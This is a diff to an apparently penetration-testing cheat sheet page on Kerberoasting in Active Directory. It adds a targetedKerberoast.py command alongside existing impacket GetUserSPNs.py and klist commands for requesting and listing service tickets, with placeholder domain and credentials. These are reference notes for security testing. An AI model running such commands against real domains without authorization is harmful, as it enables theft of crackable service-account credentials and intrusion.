@@ -1297,6 +1297,9 @@ GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span 
 <p>Request TGS for the found SPN's user using impacket's <code>GetUserSPNs</code>:</p>
 <div class="highlight"><pre><span></span><code>python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request-user<span class="w"> </span>&lt;SPN<span class="err">'</span>s<span class="w"> </span>user&gt;
 </code></pre></div>
+<p>Request TGS for all users on which current one as enough privileges using the Targeted Kerberoast technique with <a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast.py</a>:</p>
+<div class="highlight"><pre><span></span><code>targetedKerberoast.py<span class="w"> </span>-d<span class="w"> </span><span class="s1">'&lt;domain&gt;'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;owned user&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span>
+</code></pre></div>
 <p>List tickets in memory:</p>
 <div class="highlight"><pre><span></span><code>klist
 </code></pre></div>
